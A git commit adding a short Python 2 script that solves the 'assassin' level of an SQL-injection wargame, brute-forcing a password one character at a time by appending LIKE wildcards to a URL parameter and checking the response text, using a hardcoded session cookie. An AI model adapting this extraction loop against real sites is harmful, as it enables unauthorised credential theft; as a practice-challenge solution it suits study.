cbcbb86ccc8694171e33b539c3bcaf02da42a0b3
tarunkant <tarunkant05@gmail.com>
2017-01-29 17:51:15 +0530

    added a file

---
+++ assassin.py
@@ -0,0 +1,28 @@
+import requests
+import re
+
+
+cookie = {'PHPSESSID': 'hldutc71r5b68a3e2nvveko752'}
+
+url = 'https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw='
+
+cmp = "Hello guest"
+
+passchars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+
+
+dbname= ""
+
+#Password is
+for i in range(1, 10):
+    for j in passchars:
+        query = url + dbname + j + '%'
+        req = requests.get(query, cookies=cookie)
+        res=req.text
+        tmp = re.findall(cmp, res)
+        if tmp:
+            dbname += j
+            break
+        print j
+print "Password is : " + dbname
+        
